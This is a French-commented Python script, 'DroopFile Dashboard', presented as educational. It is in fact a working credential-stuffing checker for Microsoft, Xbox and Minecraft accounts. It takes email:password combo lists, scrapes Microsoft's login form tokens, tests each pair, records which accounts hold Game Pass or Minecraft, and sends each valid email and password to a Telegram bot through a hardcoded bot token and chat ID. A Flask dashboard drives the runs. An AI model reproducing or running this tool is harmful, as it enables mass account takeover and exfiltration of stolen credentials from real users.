#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DroopFile Dashboard - Version Finale
Auteur: Utilisateur
Description: Tableau de bord pour l'analyse de comptes Microsoft/Xbox/Minecraft.
Ce code est fourni à des fins éducatives uniquement.
"""

import os
import re
import sys
import json
import time
import base64
import hmac
import hashlib
import logging
import threading
import concurrent.futures
import subprocess
import warnings
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# ============================================================
# INSTALLATION AUTOMATIQUE DES DÉPENDANCES
# ============================================================

try:
    import requests
    import urllib3
    from colorama import Fore, Style, init
    from flask import Flask, render_template, jsonify, request
    MODULES_OK = True
except ImportError as e:
    MODULES_OK = False
    print(f"❌ Module manquant: {e}")
    print("▶ Exécutez: pip install flask requests colorama urllib3")
    sys.exit(1)

# ============================================================
# CONFIGURATION DU LOGGING
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

# ============================================================
# CONSTANTES
# ============================================================

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES = 3
REQUEST_TIMEOUT = 15
THREAD_COUNT = 10  # Réduit pour éviter 429

BOT_TOKEN = "MTUzMjAyMzE4MjI4MDg4NDI2Ng.GEQ2Zf.I9nzsKJRe5thRAtCiJ6Z3llqitGgzzYbrK5pNU"
CHAT_ID = "1218286868333072473"

# ============================================================
# CLASSE STATS (AVEC THREAD-LOCAL)
# ============================================================

class Stats:
    def __init__(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.minecraft = 0
        self.gamepass = 0
        self.xbox = 0
        self.not_linked = 0
        self.retries = 0
        self.start_time = time.time()
        self._lock = threading.Lock()
        self._local = threading.local()

    def set_current_email(self, email):
        self._local.current_email = email

    def get_current_email(self):
        return getattr(self._local, 'current_email', '')

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        return int((self.checked / elapsed) * 60) if elapsed > 0 else 0

stats = Stats()

# ============================================================
# TELEGRAM
# ============================================================

class TelegramBot:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"

    def send_message(self, text):
        try:
            r = requests.post(
                f"{self.base_url}/sendMessage",
                data={"chat_id": self.chat_id, "text": text, "parse_mode": "HTML"},
                timeout=30
            )
            if r.status_code != 200:
                logger.error(f"Telegram error: {r.status_code}")
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Telegram send_message error: {e}")
            return False

    def send_video(self, video_url, caption=""):
        try:
            r = requests.post(
                f"{self.base_url}/sendVideo",
                data={"chat_id": self.chat_id, "video": video_url, "caption": caption, "parse_mode": "HTML"},
                timeout=60
            )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Telegram send_video error: {e}")
            return False

    def send_document(self, file_path, caption=""):
        try:
            if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
                return False
            with open(file_path, 'rb') as f:
                r = requests.post(
                    f"{self.base_url}/sendDocument",
                    files={"document": f},
                    data={"chat_id": self.chat_id, "caption": caption},
                    timeout=60
                )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Telegram send_document error: {e}")
            return False

bot = TelegramBot(BOT_TOKEN, CHAT_ID)

# ============================================================
# FONCTIONS DE SAUVEGARDE (AVEC VERROU)
# ============================================================

RESULTS_DIR = "Results"
os.makedirs(RESULTS_DIR, exist_ok=True)

FILE_MAP = {
    "minecraft": os.path.join(RESULTS_DIR, "minecraft_hits.txt"),
    "gamepass": os.path.join(RESULTS_DIR, "gamepass_hits.txt"),
    "xbox": os.path.join(RESULTS_DIR, "xbox_hits.txt"),
    "not_linked": os.path.join(RESULTS_DIR, "not_linked.txt"),
    "twofa": os.path.join(RESULTS_DIR, "2fa.txt"),
}

file_lock = threading.Lock()

def save_hit(category, content):
    path = FILE_MAP.get(category)
    if not path:
        return
    with file_lock:
        try:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except Exception as e:
            logger.error(f"Save hit error: {e}")

# ============================================================
# AUTHENTIFICATION MICROSOFT (VERSION ROBUSTE)
# ============================================================

def get_sftag(session):
    """Extraction robuste de sFTTag et urlPost avec 3 méthodes alternatives."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    for attempt in range(MAX_RETRIES):
        try:
            response = session.get(SFTAG_URL, headers=headers, timeout=REQUEST_TIMEOUT)
            text = response.text

            ppft = None
            url_post = None

            # Méthode 1: JSON config
            json_match = re.search(r'<script[^>]*id="[^"]*"[^>]*>var\s+config\s*=\s*({.*?});</script>', text, re.DOTALL)
            if json_match:
                try:
                    config = json.loads(json_match.group(1))
                    ppft = config.get('sFTTag') or config.get('ppft') or config.get('PPFT')
                    url_post = config.get('urlPost')
                except:
                    pass

            # Méthode 2: Recherche directe
            if not ppft:
                ppft_match = re.search(r'name="PPFT"\s+value="([^"]+)"', text, re.I)
                if ppft_match:
                    ppft = ppft_match.group(1)
                else:
                    ppft_match = re.search(r'"sFTTag":"([^"]+)"', text, re.I)
                    if ppft_match:
                        ppft = ppft_match.group(1)

            if not url_post:
                url_match = re.search(r'<form[^>]+action=["\']([^"\']+)["\']', text, re.I)
                if url_match:
                    url_post = url_match.group(1)
                else:
                    url_match = re.search(r'"urlPost":"([^"]+)"', text, re.I)
                    if url_match:
                        url_post = url_match.group(1)

            if ppft and url_post:
                return url_post, ppft

            logger.warning(f"get_sftag attempt {attempt+1} failed, retrying...")
            time.sleep(0.5 * (attempt + 1))

        except Exception as e:
            logger.error(f"get_sftag attempt {attempt+1}: {e}")

    logger.error("Failed to extract sFTTag and urlPost")
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    """Authentification Microsoft avec gestion d'erreur complète."""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': SFTAG_URL,
        'Upgrade-Insecure-Requests': '1',
    }

    data = {
        'login': email,
        'loginfmt': email,
        'passwd': password,
        'PPFT': sftag
    }

    for attempt in range(MAX_RETRIES):
        try:
            response = session.post(
                url_post,
                data=data,
                headers=headers,
                allow_redirects=True,
                timeout=REQUEST_TIMEOUT
            )

            text = response.text.lower()
            final_url = response.url

            # 1. Détection 2FA
            if any(x in text for x in ['twofactor', '2fa', 'verification', 'security code', 'enter the code']):
                return None, "2fa"

            # 2. Détection Bad Credentials
            if any(x in text for x in [
                "password is incorrect",
                "account doesn't exist",
                "sign in to your microsoft account",
                "incorrect password",
                "we couldn't find an account"
            ]):
                return None, "bad"

            # 3. Extraction du token
            if '#' in final_url and final_url != SFTAG_URL:
                fragment = urlparse(final_url).fragment
                params = parse_qs(fragment)
                token = params.get('access_token', [None])[0]
                if token and token != "None":
                    return token, "success"

            # 4. Gestion du cas "Cancel"
            if 'cancel?mkt=' in response.text:
                try:
                    ipt = re.search(r'name="ipt"\s+value="([^"]+)"', response.text)
                    pprid = re.search(r'name="pprid"\s+value="([^"]+)"', response.text)
                    uaid = re.search(r'name="uaid"\s+value="([^"]+)"', response.text)
                    action = re.search(r'<form[^>]+action="([^"]+)"', response.text)

                    if ipt and pprid and uaid and action:
                        d = {'ipt': ipt.group(1), 'pprid': pprid.group(1), 'uaid': uaid.group(1)}
                        ret = session.post(action.group(1), data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                        token = parse_qs(urlparse(ret.url).fragment).get('access_token', [None])[0]
                        if token and token != "None":
                            return token, "success"
                except Exception as e:
                    logger.debug(f"Cancel handling: {e}")

            if attempt < MAX_RETRIES - 1:
                time.sleep(1)

        except Exception as e:
            logger.warning(f"microsoft_auth attempt {attempt+1}: {e}")
            if attempt == MAX_RETRIES - 1:
                return None, "error"
            time.sleep(1)

    return None, "error"

# ============================================================
# XBOX / MINECRAFT AUTH
# ============================================================

def get_xbox_token(session, ms_token):
    for attempt in range(MAX_RETRIES):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            r = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if r.status_code == 200:
                data = r.json()
                return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
            elif r.status_code == 429:
                time.sleep(2)
            else:
                logger.warning(f"Xbox token HTTP {r.status_code}")
        except Exception as e:
            logger.warning(f"get_xbox_token attempt {attempt+1}: {e}")
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token):
    for attempt in range(MAX_RETRIES):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            r = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if r.status_code == 200:
                return r.json().get('Token')
            elif r.status_code == 429:
                time.sleep(2)
            else:
                logger.warning(f"XSTS HTTP {r.status_code}")
        except Exception as e:
            logger.warning(f"get_xsts_token: {e}")
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token):
    for attempt in range(MAX_RETRIES):
        try:
            r = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if r.status_code == 200:
                return r.json().get('access_token')
            elif r.status_code == 429:
                time.sleep(2)
            else:
                logger.warning(f"Minecraft token HTTP {r.status_code}")
        except Exception as e:
            logger.warning(f"get_minecraft_token: {e}")
        time.sleep(0.5)
    return None

def check_entitlements(session, mc_token):
    """Vérification des droits Minecraft avec parsing JSON correct."""
    for attempt in range(MAX_RETRIES):
        try:
            r = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    entitlements = data.get('entitlements', [])
                    names = [e.get('name', '').lower() for e in entitlements]

                    if 'product_game_pass_ultimate' in names or any('ultimate' in n for n in names):
                        return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                    elif 'product_game_pass_pc' in names or any('game_pass' in n for n in names):
                        return 'Xbox Game Pass', ["Xbox Game Pass"]
                    elif 'product_minecraft' in names or any('minecraft' in n for n in names):
                        return 'Minecraft', ["Minecraft Java"]
                    else:
                        others = []
                        if any('bedrock' in n for n in names):
                            others.append("Bedrock")
                        if any('legends' in n for n in names):
                            others.append("Legends")
                        if any('dungeons' in n for n in names):
                            others.append("Dungeons")
                        if others:
                            return 'Xbox: ' + ', '.join(others), others
                        return None, []
                except json.JSONDecodeError:
                    logger.error("Invalid JSON from entitlements")
            elif r.status_code == 429:
                time.sleep(2)
            else:
                logger.warning(f"Entitlements HTTP {r.status_code}")
        except Exception as e:
            logger.warning(f"check_entitlements: {e}")
        time.sleep(0.5)
    return None, []

def get_profile(session, mc_token):
    for attempt in range(MAX_RETRIES):
        try:
            r = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if r.status_code == 200:
                return r.json()
            elif r.status_code == 404:
                return None
            elif r.status_code == 429:
                time.sleep(2)
        except Exception as e:
            logger.warning(f"get_profile: {e}")
        time.sleep(0.5)
    return None

def get_xbox_profile(session, uhs, xsts_token):
    for attempt in range(MAX_RETRIES):
        try:
            auth = f"XBL3.0 x={uhs};{xsts_token}"
            r = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                headers={
                    "Authorization": auth,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=REQUEST_TIMEOUT
            )
            if r.status_code == 200:
                data = r.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                return {
                    "gamertag": settings.get("Gamertag", "N/A"),
                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
                    "tier": settings.get("AccountTier", "N/A"),
                    "rep": settings.get("XboxOneRep", "N/A"),
                }
            elif r.status_code == 429:
                time.sleep(2)
            else:
                logger.warning(f"Xbox profile HTTP {r.status_code}")
        except Exception as e:
            logger.warning(f"get_xbox_profile: {e}")
        time.sleep(0.5)
    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}

# ============================================================
# CHECK ACCOUNT
# ============================================================

def check_account(combo):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with stats._lock:
                stats.bad += 1
                stats.checked += 1
            return

        email = parts[0]
        password = ':'.join(parts[1:])
        stats.set_current_email(email)

        session = requests.Session()
        # ✅ Ne pas désactiver la vérification TLS

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with stats._lock:
                stats.errors += 1
                stats.checked += 1
            return

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

        if auth_status == "2fa":
            with stats._lock:
                stats.twofa += 1
                stats.checked += 1
            save_hit("twofa", f"{email}:{password}")
            return

        if auth_status == "bad":
            with stats._lock:
                stats.bad += 1
                stats.checked += 1
            return

        if auth_status != "success" or not ms_token:
            with stats._lock:
                stats.errors += 1
                stats.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            with stats._lock:
                stats.bad += 1
                stats.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            with stats._lock:
                stats.bad += 1
                stats.checked += 1
            return

        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        gamertag = xbox_profile.get("gamertag", "N/A")
        gamerpic = xbox_profile.get("gamerpic", "")
        tier = xbox_profile.get("tier", "N/A")
        rep = xbox_profile.get("rep", "N/A")

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            with stats._lock:
                stats.bad += 1
                stats.checked += 1
            return

        account_type, subs = check_entitlements(session, mc_token)

        if not account_type:
            with stats._lock:
                stats.not_linked += 1
                stats.hits += 1
                stats.checked += 1
            save_hit("not_linked", f"{email}:{password} | Gamertag: {gamertag}")
            return

        profile = get_profile(session, mc_token)
        name = profile.get('name', 'N/A') if profile else "Not Set"
        uuid = profile.get('id', 'N/A') if profile else "N/A"
        capes = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"

        capture = (
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"Gamertag: {gamertag}\n"
            f"MC Name: {name}\n"
            f"UUID: {uuid}\n"
            f"Capes: {capes}\n"
            f"Type: {account_type}\n"
            f"Subs: {', '.join(subs) if subs else 'None'}\n"
            f"{'='*40}"
        )

        if 'Ultimate' in account_type or 'Game Pass' in account_type:
            with stats._lock:
                stats.gamepass += 1
            save_hit("gamepass", capture)
        elif 'Minecraft' in account_type:
            with stats._lock:
                stats.minecraft += 1
            save_hit("minecraft", capture)
        else:
            with stats._lock:
                stats.xbox += 1
            save_hit("xbox", capture)

        with stats._lock:
            stats.hits += 1
            stats.checked += 1

        # Envoi Telegram
        threading.Thread(
            target=bot.send_message,
            args=(f"✅ Hit!\nEmail: {email}\nPassword: {password}\nType: {account_type}\nGamertag: {gamertag}",),
            daemon=True
        ).start()

    except Exception as e:
        logger.error(f"check_account error for {combo[:20]}: {e}")
        with stats._lock:
            stats.errors += 1
            stats.checked += 1

# ============================================================
# START CHECKING (AUTO)
# ============================================================

Combos = []

def start_checking_auto():
    global Combos
    if not Combos:
        logger.error("No combos loaded!")
        return

    total = len(Combos)
    logger.info(f"Loaded {total} combos, threads: {THREAD_COUNT}")

    with stats._lock:
        stats.checked = 0
        stats.hits = 0
        stats.bad = 0
        stats.twofa = 0
        stats.errors = 0
        stats.minecraft = 0
        stats.gamepass = 0
        stats.xbox = 0
        stats.not_linked = 0
        stats.retries = 0
        stats.start_time = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = {executor.submit(check_account, c): c for c in Combos}
        for future in concurrent.futures.as_completed(futures):
            pass

    logger.info("Checking complete!")
    bot.send_message(f"✅ Final Stats:\nChecked: {stats.checked}\nHits: {stats.hits}\nBad: {stats.bad}\n2FA: {stats.twofa}")

    # Envoi des fichiers
    for name, path in FILE_MAP.items():
        if os.path.exists(path) and os.path.getsize(path) > 0:
            bot.send_document(path, f"📁 {os.path.basename(path)}")

# ============================================================
# FLASK SERVER
# ============================================================

app = Flask(__name__)
running = False
current_combos = []

def get_stats():
    with stats._lock:
        return {
            "total": len(current_combos),
            "hits": stats.hits,
            "twofa": stats.twofa,
            "bad": stats.bad,
            "progress": int((stats.checked / max(1, len(current_combos))) * 100),
            "status": "SCANNING" if running else "COMPLETED" if stats.checked > 0 else "READY",
            "services": {
                "Minecraft": stats.minecraft,
                "GamePass": stats.gamepass,
                "Xbox": stats.xbox,
                "NotLinked": stats.not_linked,
            }
        }

def get_logs():
    with stats._lock:
        return [
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Checked: {stats.checked}", "type": "info"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Hits: {stats.hits}", "type": "ok"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Bad: {stats.bad}", "type": "warn"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"Minecraft: {stats.minecraft}", "type": "ok"},
            {"time": datetime.now().strftime("%H:%M:%S"), "msg": f"GamePass: {stats.gamepass}", "type": "ok"},
        ]

def run_checker():
    global running, current_combos
    if not current_combos:
        return
    running = True
    stats.start_time = time.time()
    Combos = current_combos

    def thread_func():
        global running
        try:
            start_checking_auto()
        except Exception as e:
            logger.error(f"Checker error: {e}")
        finally:
            running = False

    threading.Thread(target=thread_func, daemon=True).start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    f = request.files['file']
    if f.filename == '':
        return jsonify({"error": "No file selected"}), 400
    f.save('combos.txt')
    return jsonify({"message": "File uploaded!"})

@app.route('/api/start', methods=['POST'])
def start():
    global current_combos, running
    if running:
        return jsonify({"status": "already_running"})
    if not os.path.exists("combos.txt"):
        return jsonify({"status": "error", "message": "combos.txt not found"})
    with open("combos.txt", 'r', encoding='utf-8', errors='ignore') as f:
        current_combos = [line.strip() for line in f if line.strip() and ':' in line]
    if not current_combos:
        return jsonify({"status": "error", "message": "No valid combos"})
    with stats._lock:
        stats.checked = stats.hits = stats.bad = stats.twofa = stats.minecraft = stats.gamepass = stats.xbox = stats.not_linked = stats.errors = 0
    run_checker()
    return jsonify({"status": "started"})

@app.route('/api/status')
def status():
    return jsonify(get_stats())

@app.route('/api/logs')
def logs():
    return jsonify(get_logs())

@app.route('/api/reset', methods=['POST'])
def reset():
    global current_combos, running
    running = False
    current_combos = []
    with stats._lock:
        stats.checked = stats.hits = stats.bad = stats.twofa = stats.minecraft = stats.gamepass = stats.xbox = stats.not_linked = stats.errors = 0
    return jsonify({"status": "reset"})

# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    print("""
    ═══════════════════════════════════════════
      DroopFile Dashboard
      URL: http://127.0.0.1:5000
    ═══════════════════════════════════════════
    """)
    app.run(debug=True, host='0.0.0.0', port=5000)
